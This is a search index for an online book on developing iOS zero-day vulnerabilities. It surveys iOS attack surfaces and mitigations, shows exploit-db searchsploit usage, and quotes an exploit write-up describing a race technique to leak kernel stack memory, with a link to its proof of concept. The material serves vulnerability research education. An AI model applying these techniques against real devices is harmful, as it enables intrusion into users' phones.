{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"The Road to Zero","text":"<p>This website describes how to develop your own zero day vulnerabilities in iOS.</p>"},{"location":"#preface","title":"Preface","text":"<p>This book has come about because having written a book on iOS Crash Dump Analysis, I found that most of my audience were security-focussed engineers.</p> <p>I share the same passion.  I have been studying various \"Crack Me\" challenges.  I thought I was doing the correct preparation for vulnerability analysis.</p> <p>When I looked at successful exploits, mostly on Google Project Zero, I found there was a technique gap.  Not only do you need to apply standard techniques, you need to apply them on unfamiliar APIs, such as <code>IOSurface</code> and <code>XPC</code>.  So I naturally looked at Crack Me challenges using those APIs.  I wasn't able to find any.</p> <p>What I am attempting to do is to document my journey in acquiring the skills to find Zero Day Vulnerabilities on iOS in the form of a book.  That is so that future engineers will have a book to take them along the same journey.</p> <p>So the nature of this book is mostly a tutorial but with appropriate theory explanations or system knowledge explained along the way.</p> <p>I take the view that when you are exploring new things, cost barriers are magnified because you are not sure at the time whether you will stick with it or enjoy it.  Paying a lot of money for golf clubs is a straightforward choice if you've already fallen in love with the game.  So I am going to work on the basis the reader has modest resources to hand (compared to the professionals in this area).  I assume you have an iDevice, a Mac, an Xcode developer account, and maybe software, free or licensed at modest cost.</p> <p>There is one last element I intend to add to the mix.  The Hacker Mentality.  This is the attitude of mind where an innocent piece of information can be viewed through a hacker's lens.  That offers the foothold for us to commence experimentation and discovery that then later will result in new vulnerabilities.</p> <p>If I am successful, I hope this book will become the handbook of vulnerability craftsmanship in the same way that Code Complete became the handbook of software craftsmanship.</p> <p>One thing in particular that attracts me to iOS is that its one of the hardest platforms to circumvent.  It may turn out I don't reach the high bar needed to make progress on this platform.  But if it was going to be easy, what would be the point in trying?</p>"},{"location":"#acknowledgements","title":"Acknowledgements","text":"<p>I'd like to acknowledge the help and support of my colleagues for writing this book.</p> <p>Putting together this work was only possible because it was built upon generously provided open source tools which made writing the text of the book a pleasure.</p> <p>Lastly, I'd like to thank my supportive family whilst I was locked in my study, and largely absent. Thank you Junghyun, and Christopher.</p>"},{"location":"#disclaimer","title":"Disclaimer","text":"<p>Copyright Faisal Memon 2021. All Rights Reserved.</p> <p>This publication is provided \"as is\" without warranty of any kind, either express or implied, including, but not limited to, the implied warranties of merchantability, fitness for a particular purpose, or non-infringement.</p> <p>This publication could include technical inaccuracies or typographical errors. Changes are periodically added to the information herein. These changes will be incorporated in new editions of the publication.</p> <p>Apple makes no explicit or implied endorsement of this work. Materials in this book have been determined from public information sources and binaries, or materials provided by the Apple Software Development Kits.</p> <p>Positions held by the author, as an employee or contractor, at past or future companies and institutions makes no explicit or implied endorsement of this work by those entities.</p>"},{"location":"#trademarks","title":"Trademarks","text":"<p>Every effort has been made to identify trademark terms in this text. If there is an error or omission, please contact the author. We have thus far recognized the following trademarks:</p>"},{"location":"#cisco","title":"Cisco","text":"<ul> <li>iOS (but licensed to Apple)</li> </ul>"},{"location":"#apple","title":"Apple","text":"<ul> <li>Darwin</li> <li>UNIX</li> <li>NeXT</li> <li>macOS</li> <li>tvOS</li> <li>watchOS</li> <li>iPhone</li> <li>iPod</li> <li>iPad</li> <li>iCloud</li> <li>MacBook Pro</li> </ul>"},{"location":"#usb-implementers-forum","title":"USB Implementers Forum","text":"<ul> <li>USB-C</li> </ul>"},{"location":"#intel","title":"Intel","text":"<ul> <li>Thunderbolt</li> </ul>"},{"location":"AttackSurface/","title":"Attack Surface","text":"<p>In this chapter we look at the attack surface of iOS.  This is largely driven by researching the security bulletins associated with each release of iOS.  There may be aspects of the iOS platform which have not yet been explored but it is safe to say all the fruitful areas of attack have been tried and there has been a track record of success.</p>"},{"location":"AttackSurface/#history-of-ios-attacks","title":"History of iOS Attacks","text":"<p>There has never been a release of iOS without security vulnerabilities.  This is expected given the size and complexity of the OS, its middleware, application programs, and associated services.</p> <p>The trend is that new functionality is added to each release, but the older functionality is retained.  The older technology areas continue to see attacks, and the newer functionality is attacks.</p>"},{"location":"AttackSurface/#increasing-variety-of-attacks","title":"Increasing variety of attacks","text":"<p>The attacks have been cummulative across OS releases.  For example, iOS 1.x (strictly known as iPhoneOS) was vulnerable to WebKit based attacks.  Each version onwards has had a WebKit based attack also.  However, the method of attack has changed due to the mitigations employed by Apple.  Each new release sees a new type of attack, partly as a result of new functionality and technology being added to the device.</p> <p>Whilst it seems that newer releases have more vulnerabilities than earlier releases, it is better to think of attacks as a cottage industry.  In this we mean that once someone has expertise in Wireless attacks, that expertise expands over time as Wireless mitigations improve, creating a cat-and-mouse game.  The same being true for WebKit, SMS, Networking, etc. we thus see a cottage industry of attacks, where each person (or \"cottage\") is working on their own technology area as their attack vector.</p> <p>What is means for an attacker is that it is sufficient to stay within a specific technology domain and master the skills to attack that area.  The secret is depth of skills, not breadth of knowledge.  The reason for this is that attacks are possible in many areas because the distribution of zero-days is widespread.</p> <p>The most fortified area of iOS is the SMS and other autonomous aspects of functionality.  These yield the most valuable attacks, so-called \"0-click\" attacks.</p> <p>The web side of things is also fortified.  But the web is so complex and there is a need to stay on top of evolving standards to compete with other devices that provide a web experience.  Therefore the attack surface via the web continues to be significant and promising to an attacker.  Overall, the center of gravity has landed on web-based attacks.  These offer \"1-click\" attacks, the next best thing to \"0-click\" attacks.</p>"},{"location":"AttackSurface/#web-is-the-most-fruitful-area-for-attack","title":"Web is the most fruitful area for attack","text":"<p>From studying the security disclosure notices from Apple, the pattern is clear.  Attacks are dominated by WebKit and Web-technologies.  This is because an attack mounted from inside an app can be ejected from the App Store to stop the malware being spread.  Furthermore, Apple can reach out to devices that have already installed an App and remotely delete it.  This facility is little-advertised because it demostrates the reach and power of Apple over the device ecosystem.  Such software would be considered \"malware\".</p>"},{"location":"AttackSurface/#app-review-kills-the-malware-vector","title":"App Review kills the malware vector","text":"<p>One purpose of Apple App Review is to identify malware either by static or dynamic analysis, or by human review.  So the only way such software ends up on the device would either be through Enterprise App Distribution, or by volunteering to run such software.</p> <p>App Review is the most significant distinction between an iDevice and historic software distribution platforms.  Much of the computer security industry deals with Malware and its related variants.  Most security attacks are malware driven.  No human is needed so it scales.  Targeted attacks are a combination of Phishing and Malware.  It is harder to scale due to human effort to tailor the attack.  But significant financial or other rewards can offset this cost.</p>"},{"location":"AttackSurface/#enterprise-distribution-of-malware","title":"Enterprise distribution of malware","text":"<p>Enterprise distribution certificates are hard to acquire from Apple as a result of due dilligence checks needed to acquire an Enterprise Developer Account.  These can be invalidated by Apple, and the iDevice calls home to see if a certificate is invalid.  So this attack route comes down to timely identification and disablement of such certificates.  Enterprise credentials are sometimes stolen by malicious actors, and then malware is distributed without the owner being aware of the problem.</p>"},{"location":"AttackSurface/#web-based-attack","title":"Web based attack","text":"<p>Web-based attacks avoid the App Store malware checks, and since websites are not allow-listed for access by Apple, anyone can host malicious content and trick a user to visit their site.  So this would be an attack comprising of both social engineering and technical means.  We would call these \"1-click\" attacks.</p>"},{"location":"AttackSurface/#autonomous-attack","title":"Autonomous attack","text":"<p>The rarest type of attack are attacks on the autonomous processing of an iDevice.  For example, receipt of an SMS message is involuntary on behalf of the user.  Such messages can have rich content, and thus form an attack surface.  We would call these \"0-click\" attacks.</p>"},{"location":"AttackSurface/#jailbreak-attack","title":"Jailbreak attack","text":"<p>Jailbreak software is special because it exploits the system to remove security protections because the owner desires this circumvention.  So it is in an adjacent category to malware.  Here any attack vector is \"acceptable\".  For example, a jailbreak could be deployed from a website or via downloaded software, or downloaded source code.  Jailbreak software needs to deal with code signing in order to get the app to run on the iDevice.  For registered developers they have their own signing credentials so this is not a problem.</p> <p>For non-developers, various tools are available that automate the signing of the app via the Free developer account method Apple setup to facilitate learning and deployment of Apps in an Educational setting.  That is, spreading and popularizing the understanding of App development.  The Free access is now broken for such automated tooling due to it being abused for Jailbreak signing.</p>"},{"location":"AttackSurface/#attack-surface_1","title":"Attack Surface","text":"<p>The most important technology attack surface is the Web. All areas of web technology have been used to create exploits.</p> <p>In iOS, WebKit is used to serve web-based technologies.  It is open source.</p> <p>From studying the security disclosures of each version of iOS, the following breeakdown can be seen of areas used to create exploits.</p> <ul> <li> <p>WebKit</p> <ul> <li>Certificates</li> <li>Javascript</li> <li>UTF-8</li> <li>XSLT</li> <li>CSS</li> <li>SVG</li> <li>DOM</li> <li>CORS</li> <li>Parsing</li> <li>XSS</li> <li>HTML</li> <li>HTTP</li> <li>NTLM</li> </ul> </li> <li> <p>Networking</p> <ul> <li>Proxy Server</li> <li>IPSec</li> <li>DNS</li> <li>ICMP</li> <li>PIM</li> <li>SSLv3/TLS 1.0</li> <li>TCP</li> <li>WiFi Credentials</li> <li>VPN</li> <li>BPF</li> <li>Personal Hotspot</li> <li>LEAP</li> <li>HSTS</li> <li>NetworkExtension</li> </ul> </li> <li> <p>Graphics</p> <ul> <li>CoreGraphics</li> <li>Image Processing</li> <li>PNG</li> <li>TIFF</li> <li>GIF</li> <li>PDF</li> <li>XBM</li> <li>IOSurface</li> <li>CoreMedia</li> <li>GLSL</li> </ul> </li> <li> <p>Application Sandbox</p> <ul> <li>System Logs</li> <li>Scripts</li> </ul> </li> <li> <p>Passcode</p> </li> <li> <p>Passbook</p> </li> <li> <p>File format processing</p> <ul> <li>MS Office files</li> </ul> </li> <li> <p>Configuration Profiles</p> </li> <li> <p>GSM</p> <ul> <li>TMSI</li> </ul> </li> <li> <p>Unicode</p> </li> <li> <p>Libraries</p> <ul> <li>libxml</li> <li>libresolv</li> <li>libc</li> <li>libinfo</li> <li>libpthread</li> <li>libxpc</li> <li>libxml2</li> <li>libgssapi</li> <li>zlib</li> <li>OpenSSL</li> <li>SQLite</li> </ul> </li> <li> <p>Mail</p> <ul> <li>HTML</li> <li>Exchange</li> <li>Cookies</li> <li>S/MIME</li> </ul> </li> <li> <p>Video</p> <ul> <li>MPEG-4</li> </ul> </li> <li> <p>Safari</p> <ul> <li>History</li> <li>Clickjacking</li> <li>Cookies</li> <li>Certificates</li> </ul> </li> <li> <p>Messaging</p> <ul> <li>SMS</li> </ul> </li> <li> <p>Calendar</p> <ul> <li>CalDAV</li> </ul> </li> <li> <p>Settings</p> <ul> <li>Parental Restrictions</li> </ul> </li> <li> <p>Alerts</p> </li> <li> <p>Kernel</p> <ul> <li>Codesigning</li> <li>Kernel address leak </li> <li>IOKit, IOKitUser, IOSerialFamily, IOHIDFamily, IOAcceleratorFamily, IOMobileFrameBuffer</li> <li>AppleMobileFileIntegrity</li> </ul> </li> <li> <p>USB Host</p> </li> <li> <p>dyld</p> </li> <li> <p>launchd</p> </li> <li> <p>File System</p> <ul> <li>HFS</li> <li>AppleDouble</li> <li>Restore from Backup</li> <li>AppleFileConduit</li> <li>AirTraffic</li> <li>DiskImages</li> </ul> </li> <li> <p>Siri</p> <ul> <li>Email</li> </ul> </li> <li> <p>Keyboards</p> <ul> <li>QuickType</li> </ul> </li> <li> <p>syslog</p> </li> </ul> <p>-Telephony     - SIM/UIM</p>"},{"location":"AttackSurface/#types-of-attackers","title":"Types of Attackers","text":"<p>From looking at the security disclosures of iOS a stark pattern arises.  There are three classes of attackers:</p> <ul> <li>Accidental Finders</li> <li>Systematic Finders</li> <li>Motivated Attackers</li> </ul>"},{"location":"AttackSurface/#accidental-finders","title":"Accidental Finders","text":"<p>In this group, the author was tangentially involved with security and reported a vulnerability, usually an information disclosure, as a on-off report.  </p>"},{"location":"AttackSurface/#systematic-finders","title":"Systematic Finders","text":"<p>In this group, the author is normally in a team with a remit to find vulnerabilities and they often use systematic techniques.  For example, a fuzz testing tool, or an address sanitizer.  Often they have a focus on one particular area, for which they find multiple bugs.  These are often in the same OS release.</p>"},{"location":"AttackSurface/#motivated-attackers","title":"Motivated Attackers","text":"<p>In this group the author, or team, is actually trying to get into the iDevice for a further goal.  It could be to further exploit the phone, or to fashion a Jailbreak.  These are the best bugs because they tend to be more powerful bugs.  They reveal more about the attack techniques that can be used against the system and how to understand how to handle OS mitigations.</p>"},{"location":"AttackSurface/#interesting-people","title":"Interesting People","text":"<p>The most capable attackers are sometimes working on their own, working as part of a company to improve security, or are working as part of a hacking team.  They either are a Motivated Attacker, or simulate being a Motivated Attacker.</p> <p>Here is a partial list of these interesting attackers:</p> <ul> <li>pod2g</li> <li>evad3rs (pod2g, MuscleNerd, planetbeing, pimskeks)</li> <li>iOS Jailbreak Dream Team</li> <li>Dan Rosenberg</li> <li>comex</li> <li>Mark Dowd</li> <li>Abhishek Arya</li> <li>Adam Barth</li> <li>Charlie Miller</li> <li>Stefan Esser</li> <li>dent1zt</li> <li>Andy Davis</li> <li>Ian Beer</li> <li>PanguTeam</li> <li>Jonathan Zdziarski </li> <li>Kevin DeLong</li> <li>TaiG Jailbreak Team</li> <li>Michal Zalewski</li> <li>qwertyoruiop</li> <li>Jonathan Levin</li> </ul>"},{"location":"Author/","title":"About the Author","text":""},{"location":"Author/#biography","title":"Biography","text":"<p>Faisal Memon has had a long career in engineering.  He has worked on most layers of the software stack from probing noisy electrical circuits, to writing Operating System software, middleware, and apps.  Having worn the hats of software tester, developer, tech lead, architect and CTO he sees problems from a rounded perspective.</p>"},{"location":"Author/#other-work","title":"Other work","text":"<p>Faisal has also authored the book, \"iOS Crash Dump Analysis\", Second Edition.</p> <p>Purchase from Amazon.com</p> <p>Purchase from Amazon.co.uk </p>"},{"location":"Bibliography/","title":"Bibliography","text":"Reference Resource Link     Google Project Zero  https://googleprojectzero.blogspot.com/p/about-project-zero.html   Code Complete  Code Complete. Second Edition. 1st Series 0735619670. Microsoft Press.   Why I Love and Don't Love Offensive Work  https://www.youtube.com/watch?v=8QRnOpjmneo   The Road to Zero GitHub  https://github.com/faisalmemon/the-road-to-zero   Exploit Database Git Repository  https://github.com/offensive-security/exploitdb   A Programmer's Guide to the Mach System Calls  A Programmer's Guide to the Mach System Calls by Linda R. Walmer and Mary R. Thompson, Carnegie-Mellon University, 1988.   Mach  Mach Concepts by NeXT Computer, Inc. 1995. Mirror Website   *OS Internals  *OS Internals by Jonathan Levin   Entitlements Cross-Reference  Entitlements Cross-Reference by Jonathan Levin   <code>MobileSafari</code> Share Vulnerability   https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html   iOS Version History  iOS Version History   Security Content of iOS 13.6  HT211288 About the security content of iOS 13.6 and iPadOS 13.6   Common Weakness Enumeration (CWE)  Common Weakness Enumeration   History of iOS Mitigation Techniques  A Look at Modern iOS Exploit Mitigation Techniques.pdf by Luca Todesco @qwertyoruiopz   Jails: Confining the omnipotent root  Jails: Confining the omnipotent root.   Evolution of iOS Mitigations  Evolution of iOS Mitigations   AArch64TargetParser.def  LLVM AArch64TargetParser.def   Memory Tagging Extension (MTE)  Memory Tagging   KPP Tick-Tock  KPP Tick-Tock   KTRR  KTRR Kernel Text Read-Only Region"},{"location":"Defense/","title":"iOS Defense Mechanisms","text":"<p>The iOS system has become more sophisticated over time as the usage pattern and commercialisation of it has evolved.  Here we survey the history of the defense mechanisms (mitigation techniques) that have been deployed by Apple in iOS, often supported by enhancements available in hardware.</p>"},{"location":"Defense/#history-of-ios-mitigation-techniques","title":"History of iOS Mitigation Techniques","text":"iOS Version Mechanism Comment     1.x Encrypted OS images Everything runs as root; no code sign or sandbox   2.x Code Sign, Sandbox The Sandbox is the most durable and important technique to date   3.x - -   4.x ASLR/DEP (iOS 4.3) -   5.x User mode ASLR Harder to write shell code   6.x Kernel mode ASLR, Kernel Address Space isolation Harder to reach kernel"},{"location":"Defense/#os-mitigation-techniques","title":"OS Mitigation Techniques","text":""},{"location":"Defense/#code-sign-mitigation-technique","title":"Code Sign mitigation technique","text":""},{"location":"Defense/#sandbox-mitigation-technique","title":"Sandbox Mitigation Technique","text":""},{"location":"Defense/#aslr-mitigation-technique","title":"ASLR Mitigation Technique","text":""},{"location":"Defense/#dep-mitigation-technique","title":"DEP Mitigation Technique","text":""},{"location":"Defense/#history-of-hardware-mitigation-techniques","title":"History of Hardware Mitigation Techniques","text":"<p>Mitigation techniques purely in Software can have an adverse effect on performance.  When the hardware provides assistance, the software can then offer greater mitigations at no, or little, performance cost.</p> <p>Not all available hardware mitigations are used in iOS (Darwin).  But the introduction of newer hardware protections can give hints as to what software mitigations could be introduced.</p> <p>In the following table, we list recent iPhones (a representative example), the Apple Silicon that is provided, as the hardware architecture of the chip (from the compiler's perspective because that is what Darwin leverages).  Finally we list the software migitations that there then offered.</p> <p>For details on the Chip-to-Compiler architecture mapping, see  AArch64TargetParser.def.</p>    iPhone Model Apple Silicon ARM Architecture (HW Migitations) SW Mitigations     5s A7 ARMv8.0 KPP   6 A8 ARMv8.0 KPP   6s A9 ARMv8.0 KPP   7 A10 ARMv8.1 (PAN) KTRR   X A11 ARMv8.2 (PAN, HPD) KTRR, APRR   XR A12 ARMv8.3 (PAN, HPD, PAC) KTRR, APRR, PPL   11 A13 ARMv8.4 (PAN, HPD, PAC) KTRR, APRR, PPL   12 A14 ARMv8.5 (PAN, HPD, PAC, MTE) KTRR, APRR, PPL   13 A15 ARMv8.5 (PAN, HPD, PAC, MTE) KTRR, APRR, PPL"},{"location":"Defense/#hardware-mitigation-techniques","title":"Hardware Mitigation Techniques","text":""},{"location":"Defense/#pan-mitigation-technique","title":"PAN Mitigation Technique","text":""},{"location":"Defense/#hpd-mitigation-technique","title":"HPD Mitigation Technique","text":""},{"location":"Defense/#pac-mitigation-technique","title":"PAC Mitigation Technique","text":""},{"location":"Defense/#mte-mitigation-technique","title":"MTE Mitigation Technique","text":"<p>Memory Tagging Extension (MTE) is where each memory allocation is given a tag, and then any pointer that reaches that memory is checked to see if the pointer has the correct tag.  If not, it is an invalid pointer and fails.  Therefore, pointers become more restricted to where they can point to, so arbitrary maliciously crafted memory cannot be used.</p> <p>The immediate benefit of this feature is that if two separate memory allocations are done, and they are contiguous then advancing a pointer from one allocation to reach the next allocation would fail.  This therefore is a upper bound dereference guard.  Similarly if a pointer points to memory that has been deallocated and then allocated, the newly allocated memory could have a different tag to the original memory allocation.  In such cases it would defeat a Use-After-Free exploit.</p> <p>The MTE feature is not that strong because the number of tags is limited to 4 bits, and thus 16 possibilities.  As of 4th December, 2021, iOS does not enable MTE.  So it is a potential mitigation not yet being utilised.</p>"},{"location":"Defense/#software-mitigation-techniques","title":"Software Mitigation Techniques","text":""},{"location":"Defense/#kpp-mitigation-technique","title":"KPP Mitigation Technique","text":"<p>KPP is Kernel Patch Protection, also known as WatchTower.</p> <p>In ARMv8 there is a privilege model where lower privileged subsystems cannot access the memory of higher privileged subsystems (Memory Privilege), and lower privileged subsystems cannot access the CPU resources of higher privileged subsystems (Register Access Privilege).</p> <p>ARM denotes the Exception Privilege levels as EL0 (lowest privilege), through to EL1, EL2, and EL3 (highest privilege).  A given implementation does not need to use all the levels.</p> <p>Privilege level changes can only occur when an Exception occurs.  Exceptions are interruptions to the flow of execution of a program.  They can either be due to the instruction of the program being executed, or unrelated to the instruction.</p> <p>When an Exception occurs due to the instruction being executed, it is just known as an Exception.  When an Exception occurs unrelated to the instruction being executed, we call it an Interrupt (a special case of an Exception).</p> <p>KPP is a system which checks the Kernel.  To do this is runs at a higher privilege level so cannot be tampered with by Kernel code.</p> <p>To enable a separation of privileges, iOS arranges its code so:</p> <ul> <li>EL0 is where application code runs (least privilege)</li> <li>EL1 is where the kernel runs</li> <li>EL3 is where the KPP code runs</li> </ul> <p>To get to EL3 from either EL0 or EL1, an Exception is needed.</p> <p>The two Exceptions used are:</p> <ul> <li>Whenever a FPU (Floating Point Unit) instruction is executed</li> <li>Whenever a IRQ handler fires</li> </ul> <p>In the write-up by Xerub this is called Tick-Tock.  The tick is the FPU Exception, the tock is the IRQ Interrupt.  That is because it is a state machine whereby KPP checks a portion of the kernel in the tick, and re-enables the FPU upon success.  FPU usage in the tock routes interrupts into the KPP code.  If this mutually supporting state machine hits an error, the system panics.</p>"},{"location":"Defense/#ktrr-mitigation-technique","title":"KTRR Mitigation Technique","text":"<p>KTRR is Kernel Text Read-Only Region Protection.  It is a replacement for KPP which had a software bypass.</p>"},{"location":"Hammer/","title":"The Hammer","text":"<p>When studying past exploits it can feel like our brain has been hit by a hammer.  It is because most exploit discussions work on the basis that we have had an apprenticeship on all the underlying techniques, and that only that final layer needs explanation.</p> <p>This approach is understandable from the writer's perspective.  If we are a researcher we will naturally seek out underlying technologies, documentation and reading materials as part of our research journey.  The writer's audience will be such researchers.  So the writer will not dwell on the supporting techniques and technologies.</p> <p>Since iOS and macOS use many niche technologies, or use standard techniques with some Apple ecosystem unique twists, it is not so easy to do our background reading.</p> <p>In this chapter we shall look at an exploit write-up.  Our purpose is not to understand the exploit as such, but to survey the techniques and technologies at play.  It will provide us the motivation to explore such items in subsequent chapters knowing that this knowledge will then help us circle back and understand the originally presented exploit.</p>"},{"location":"Hammer/#getting-exploits","title":"Getting Exploits","text":"<p>Exploits can be downloaded from the Exploit Database Git Repository. This is a valuable resource and one we shall often refer to. The exploit database has a search tool, <code>searchsploit</code>. If we install <code>searchsploit</code> from Exploit Database Git Repository and configure our <code>~/.searchsploit_rc</code> file then we can easily look up exploits.</p> <p>This is a search for items matching <code>ios</code> and <code>dos</code>: <pre><code>searchsploit ios dos | less\n------------------------------- ---------------------------------\n Exploit Title                 |  Path\n------------------------------- ---------------------------------\nApple iOS - Kernel Stack Memor | ios/dos/45649.txt\nApple iOS 1.1.2 - Remote Denia | hardware/dos/4978.html\nApple iOS 1.1.4/2.0 / iPod 1.1 | hardware/dos/32341.html\nApple iOS 11.2.5 / watchOS 4.2 | multiple/dos/44215.m\nApple iOS 4.0.3 - DPAP Server  | ios/dos/5151.pl\nApple iOS 5.1.1 Safari Browser | ios/dos/18931.rb\nApple iOS &lt; 10.3.2 - Notificat | ios/dos/42014.txt\nApple iOS Kernel - Use-After-F | ios/dos/45652.c\nApple iOS Mobile Safari - Memo | ios/dos/31057.html\nApple iOS Safari - 'decodeURI' | hardware/dos/15794.php\nApple iOS Safari - 'decodeURIC | hardware/dos/15796.php\nApple iOS Safari - 'JS .' Remo | hardware/dos/15805.php\nApple iOS Safari - Bad 'VML' R | ios/dos/11890.txt\nApple iOS Safari - body alink  | hardware/dos/15792.php\nApple iOS Safari - Remote Deni | ios/dos/11891.txt\nApple iOS/macOS - Kernel Memor | multiple/dos/45651.c\nApple iOS/macOS - Sandbox Esca | multiple/dos/45648.txt\nApple iOS/macOS - Sandbox Esca | multiple/dos/45650.txt\nApple Mac OSX - IOSCSIPeripher | osx/dos/39376.c\n</code></pre></p> <p>Exploits can be searched for, downloaded, and then explored.  Each exploit has a number associated with it, known as the <code>EDB-ID</code>.</p>"},{"location":"Hammer/#copyin_leak-exploit-45649","title":"<code>copyin_leak</code> Exploit 45649","text":"<p>This program allows a user program to get the kernel to expose memory values it should not be able to see.  In that sense it is an information disclosure \"leak\".  The kernel routine used to do this is <code>copyin</code> hence it has been called a <code>copyin_leak</code>.</p> <p>The following command places a local copy of the exploit write-up in our local directory, known as the mirror <code>(-m)</code> command.</p> <pre><code># searchsploit -m 45649\n  Exploit: Apple iOS - Kernel Stack Memory Disclosure due to\n Failure to Check copyin Return Value\n      URL: https://www.exploit-db.com/exploits/45649\n     Path:\n /Users/faisalm/dev/exploitdb/exploits/ios/dos/45649.txt\nFile Type: ASCII text, with CRLF line terminators\n\nCopied to: /Users/faisalm/dev/scratch/45649.txt\n</code></pre> <p>From looking at the text file, we find we can download the actual Proof of Concept (POC) from a Git Hub web address.  This provides us an app to run on simulator or on an iDevice.</p> <p>This POC has been tested on <pre><code>iPod touch (7th generation)\niOS 13.5 (17F75)\n</code></pre> and <pre><code>iPod touch (7th generation) simulator\niOS 14.4 (18D46)\n</code></pre></p>"},{"location":"Hammer/#copyin_leak-write-up","title":"<code>copyin_leak</code> write-up","text":"<p>Here is the verbatim text for the write-up of this leak.  The purpose for including it is to show the \"level\" at which exploit research is aimed at.  The main aim of this book is to bring ourselves up to the same level so we can appreciate this piece of research, and then move forwards onto exploring and finding our own vulnerabilities.</p>  <p>Here's a code snippet from <code>sleh.c</code> with the second level exception handler for undefined instruction exceptions:</p>  <pre><code>static void\n handle_uncategorized(arm_saved_state_t *state, boolean_t\n instrLen2)\n {\n   exception_type_t       exception = EXC_BAD_INSTRUCTION;\n   mach_exception_data_type_t   codes[2] = {EXC_ARM_UNDEFINED};\n   mach_msg_type_number_t     numcodes = 2;\n   uint32_t          instr;   // &lt;------- (a)\n\n   if (instrLen2) {\n     uint16_t  instr16;\n     COPYIN(get_saved_state_pc(state), (char *)&amp;instr16,\n sizeof(instr16));\n\n     instr = instr16;\n   } else {\n     COPYIN(get_saved_state_pc(state), (char *)&amp;instr,\n sizeof(instr));  &lt;------- (b)\n   }\n\n ....\n\n  else {\n   codes[1] = instr;   &lt;------ (c)\n  }\n }\n\n exception_triage(exception, codes, numcodes);  &lt;-------- (d)\n</code></pre>  <p>At (a) the <code>uint32_t</code> instr is declared uninitialized on the  stack.  At (b) the code tries to copyin the bytes of the  exception-causing instruction from userspace    note that the COPYIN macro doesn't itself check the return  value of copyin, it just calls it.  At (c) <code>instr</code> is assigned to <code>codes[1]</code>, which at (d) is passed to  <code>exception_triage</code>.</p> <p>That codes array will eventually end up being sent in an  exception mach message.</p> <p>The bug is that we can force copyin to fail by unmapping the  page containing the undefined instruction  while it's being handled. (I tried to do this with XO memory but  the kernel seems to be able to copyin that just fine.)</p> <p>This PoC has an undefined instruction <code>(0xdeadbeef)</code> on its own  page and spins up a thread to keep  switching the protection of that page between <code>VM_PROT_NONE</code> and  <code>VM_PROT_READ|VM_PROT_EXECUTE</code>.</p> <p>We then keep spinning up threads which try to execute that  undefined instruction.</p> <p>If the race windows align the thread executes the undefined  instruction but when the sleh code tries to copyin  the page is unmapped, the copying fails and the exception  message we get has stale stack memory.</p> <p>This PoC just demonstrates that we do get values which aren't  <code>0xdeadbeef</code> in there for the <code>EXC_ARM_UNDEFINED</code> type.  We'd have to do a bit more fiddling to work out how to get  something specific there.</p> <p>Note that there are lots of other unchecked <code>COPYIN</code>'s in <code>sleh.c</code>  (eg when userspace tries to access a system register not allowed  for EL0) and these seem to have the same issue.</p> <p>tested on iPod Touch 6g running 11.3.1, but looking at the  kernelcache it seems to still be there in iOS 12.</p> <p>Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/m aster/bin-sploits/45649.zip</p>  <p>That's the end of the write-up.  It covers a lot of ground.  In  terms of technologies and techniques we have in the solution:</p> <ul> <li>Mach</li> <li>Mach Messages</li> <li>Mach Exceptions</li> <li>OS</li> <li>userspace and kernelspace</li> <li>copyin</li> <li>virtual memory</li> <li>exception handling</li> <li>Open Source XNU kernel</li> <li>Programming</li> <li>C and Assembly languages</li> <li>threads</li> <li>stacks</li> <li>race conditions and brute forcing</li> <li>error handling or its absence</li> </ul> <p>Now we just need to make sense of it all.</p>"},{"location":"Hammer/#the-road-ahead","title":"The Road Ahead","text":"<p>Having learnt where we can find Exploits, looking at our first  exploit, and then seeing what technologies it relies upon, we  can now chart out the road ahead.</p>"},{"location":"Hammer/#the-knowledge-we-require","title":"The Knowledge We Require","text":"<p>No one book can cover all the required topics in depth.  But with  the appropriate hacker mindset, a small subset of a large number  of technologies can be learnt within the confines of one book.</p> <p>After practice, a hacker mentality can zoom our attention to the  most \"interesting\" aspects of a given technology.  We should aim  to have a T-shaped skill profile; shallow knowledge in many  areas, but in-depth for certain pieces of those technologies.  This is in contrast to a standard engineering T-shaped knowledge  base where the in-depth knowledge is confined to one or two  technologies.</p>"},{"location":"Hammer/#engineering-sensibilities","title":"Engineering sensibilities","text":"<p>If we are a professional software engineer, and look at Proof of  Concept exploits the code structure and organisation often  chafes at our engineering sensibilities.  Compiler warning are  ignored, variable names are terse or badly named.  Functions are  badly formed, with strange names, and dispersed business logic.  Hardcoded values are rampant.  </p> <p>But the programs do \"clever\"  things and use techniques often advanced programmers are unaware  of.  This is really a reflection of the patchwork of in-depth  skills a hacker will acquire.  Brilliance in some aspects, and  beginner in others.  Of course, hackers can also be skilled  software engineers, system administrators, or have another  profession.  Such skills can be  complementary but are not foundational.  Hacker skills are not  built on top of a layer of great system administration skills,  nor software engineering skills.</p>"},{"location":"Hammer/#the-learning-pathway","title":"The learning pathway","text":"<p>There is a meta skill that underpins security research.  That is,  reading.  </p> <p>We have a goal to reach but don't know half of the  technologies needed.  So we just do an internet search, pull  down freely available learning material, and then skim through  the contents.  </p> <p>The canonical texts are usually the best.  In the  first iteration it is usually a matter of downloading a manual  of hundreds of pages.  Then pressing Page-Down repeatedly and  skimming through.  Maybe 10 seconds per page.  We are building  up a mental model from the lowest level detail in a particular  topic.  At that point we have awareness of what we don't know  but enough knowledge to know a good search query to get into  such a topic in more depth.</p>"},{"location":"Hammer/#deconstructing-our-world","title":"Deconstructing our world","text":"<p>Looking at canonical materials (that is, the text that most fully  describes the content with a minimal amount of simplification)  allows hackers to see systems as they really are, rather than an  abstraction of what they are.  </p> <p>Software engineering is really  the construction of layers of abstraction to get to a point of  understanding of the task most naturally in the problem space we  are working with.  Researchers need to think about computers in  the way they actually work, with all the abstractions stripped  bare.  </p> <p>For example, when programmers see a virtual function  in C++, they know that they need to look at what class is being  messaged to understand what function the method will invoke.  When hackers see a virtual function, they see that there must be  a Virtual Function Table where the control flow is switched to  the function that is desired.  If the strategy in the mind of  the researcher is to re-direct program control, then inspecting  the code for virtual functions can be a goal.</p> <p>Furthermore, reading a C++ manual which tells about how late  binding works (as explained above with Virtual Function tables)  allows those with a hacker mentality to make a mental note of  the implied trust relationship in that code at such points.  The  Virtual Function Table if subverted will change the operation of  the program.</p>"},{"location":"Hammer/#learning-from-exploits","title":"Learning from Exploits","text":"<p>Looking at existing exploits teaches what are the kinds of things  about technologies we have that need to be learnt.  That is so  we don't waste effort on non-critical knowledge. 